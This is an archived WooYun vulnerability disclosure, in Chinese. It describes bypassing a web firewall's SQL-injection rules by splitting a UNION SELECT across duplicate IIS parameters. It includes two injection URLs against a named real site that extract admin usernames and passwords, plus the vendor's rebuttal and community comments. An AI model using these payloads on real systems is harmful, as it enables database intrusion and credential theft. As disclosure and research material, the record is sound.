{"id": 18965, "wybug_id": "wooyun-2012-09909", "wybug_title": "创新工厂安全宝安全防护绕过漏洞(I)", "wybug_corp": "安全宝", "wybug_author": "possible", "wybug_date": "2012-07-19 22:59", "wybug_open_date": "2012-07-20 16:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧", "安全策略失效", "防注入绕过", "安全策略绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 在某些web环境下，安全宝对防范sql的部分防护规则可被绕过,继续注入... 详细说明：  很简单，利用iis对复参的特殊处理，即可绕过防护规则.构造如下请求:http://www.51qljr.com/xinxi/shownews.asp?id=(-575)UNION SELECT 1,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18 from admin返回:\n\n已经被成功阻断，简单猜测规则应该形如select.*from利用复参，分割select与from，构造如下请求:http://www.51qljr.com/xinxi/shownews.asp?id=(-575)UNION SELECT 1,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17&id=18 from admin返回\n\n   漏洞证明：  无   修复方案：  这个修复我还没想好，望看者给予补充:在进行规则匹配之前，首先向iis一样对复参进行重组,如请求name=select&name=from，重组后name=select,from然后在进行规则匹配但是这样代价很过，对所有的请求都要进行检查，是否得不偿失....还希望大家给出更好的修改建议...   版权声明：转载请注明来源 possible@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-07-20 16:34 厂商回复： 经过我们的验证，此sql语句并不能绕过安全宝的安全防护，是因为http://www.51qljr.com/这个网站没有开启安全宝的防护，这个网站开启的是 智创网站专业级防火墙，所以被绕过的是 智创网站专业级防火墙。 漏洞Rank：8  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-19 23:12 |    \t\tFlyR4nk \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:18        )\t\t \n  安全宝一直都不给力你    \n     2012-07-19 23:30 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @_@黑阔啊    \n     2012-07-19 23:37 |    \t\talso \t\t\t( 普通白帽子  |\t\t\t        Rank:424 漏洞数:52        | 招渗透/php/前端/ios&android安全，广州地...)\t\t \n  (I) 还有后续    \n     2012-07-20 00:29 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @also 我相信。。。    \n     2012-07-20 00:37 |    \t\tCp0204 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:4        | 著名艺术家)\t\t \n  坐等真想    \n     2012-07-20 08:59 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @FlyR4nk 安全宝给不给力 我不知道 我就看到安全宝rank挺给力的 呵呵 其它的都不重要的...    \n     2012-07-20 09:47 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  你和@rayh4c 研究到一块去了    \n     2012-07-20 10:22 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  @horseluke 我可没研究，能绕的方法太多了。一般国内这块都不敢放出来打擂台。    \n     2012-07-20 11:01 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n   @horseluke 我也是偶尔看到 为了刷点rank... @rayh4c 大神说的对呀，这种东西 我都不知道在网上怎么找，貌似都找不到，我还是拿你原来用的站举个例子    \n     2012-07-20 11:42 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  @possible  WooYun: 创新工厂安全宝注射  这个？ ：）      \n     2012-07-20 11:52 |    \t\tCJ也疯狂 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:3        | 专业源于专注！踏踏实实走好每一步)\t\t \n  嚯~    \n     2012-07-20 11:57 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @rayh4c  是的    \n     2012-07-20 12:09 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @rayh4c 是的 哈哈 都不敢出来打擂台 吹牛可以     \n     2012-07-20 14:14 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @Cp0204 不要等了 就怕到时让你失望，很简单的绕过...    \n     2012-07-20 14:22 |    \t\tCp0204 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:4        | 著名艺术家)\t\t \n  @possible 简单不是问题，问题是安全宝，很简单都犯，丢大脸了～    \n     2012-07-20 14:32 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @Cp0204 人非圣贤...    \n     2012-07-20 14:33 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Cp0204 安全宝这种产品应该用做cdn来    \n     2012-07-20 14:56 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @xsser 这下丢人丢大了 是误报 崩溃了，不知道是否可以改改标题 发给智创？    \n     2012-07-20 14:57 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @possible 啊？    \n     2012-07-20 17:18 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @possible http://www.wooyun.org/upload/201207/1920431263dea753e65024a9d6e8ff89a0f7263f.jpg这个不是安全宝防火墙- -.很早了的,是星外的...    \n     2012-07-20 17:21 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @_Evil额 早点告诉我 我就不来丢人了 星外是啥？上面写着 智创    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}